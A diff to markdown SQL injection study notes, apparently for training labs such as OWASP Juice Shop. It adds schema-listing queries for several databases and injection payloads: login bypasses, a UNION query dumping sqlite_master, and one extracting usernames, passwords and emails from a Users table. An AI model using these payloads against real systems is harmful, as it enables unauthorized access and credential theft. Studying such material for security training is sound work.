@@ -51,12 +51,111 @@ SQLMap is an open-source tool that automates the process of detecting and exploi
 *   `--batch`: Use default answers for all questions.
 *   `--level=5 --risk=3`: Increase the number of checks performed.
 
+Here’s the **complete list** for other major databases showing how to list table schemas (metadata about tables):
+
+---
+
+## **List table schema**
+
+### 🐬 MySQL
+
+```sql
+SELECT *
+FROM information_schema.tables
+WHERE table_schema = DATABASE();
+```
+
+---
+
+### 🪶 SQLite
+
+```sql
+SELECT * FROM sqlite_master;
+```
+
+---
+
+### 🐘 PostgreSQL
+
+```sql
+SELECT *
+FROM information_schema.tables
+WHERE table_schema NOT IN ('information_schema', 'pg_catalog');
+```
+
+Or to list all tables in the current schema:
+
+```sql
+\dt
+```
+
+(in `psql` terminal)
+
+---
+
+### 🏛️ Oracle
+
+```sql
+SELECT *
+FROM all_tables;
+```
+
+Or to list only tables owned by the current user:
+
+```sql
+SELECT *
+FROM user_tables;
+```
+
+---
+
+### 🦈 Microsoft SQL Server
+
+```sql
+SELECT *
+FROM information_schema.tables
+WHERE table_type = 'BASE TABLE';
+```
+
+Or with the database catalog view:
+
+```sql
+SELECT * FROM sys.tables;
+```
+
+---
+
+### 🧩 MariaDB
+
+*(Same as MySQL, since MariaDB is a fork)*
+
+```sql
+SELECT *
+FROM information_schema.tables
+WHERE table_schema = DATABASE();
+```
+
+---
+
+### 🐆 IBM DB2
+
+```sql
+SELECT *
+FROM syscat.tables
+WHERE tabschema NOT LIKE 'SYS%';
+```
+
+---
+
+
 ## Cheatsheet
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
 
 URL encoding:
 https://www.w3schools.com/tags/ref_urlencode.ASP
+
+
 
 ```sql
 test' or 1=1--
@@ -100,4 +199,16 @@ tester@localhost.com' --
 
 ```sql
 admin' or 1=1 --
+```
+
+```sql
+test'))+UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--
+```
+
+```sql
+test'))+UNION+SELECT+username,password,email,4,5,6,7,8,9+FROM+Users--
+```
+
+```sql
+chris.pike@juice-sh.op' --
 ```
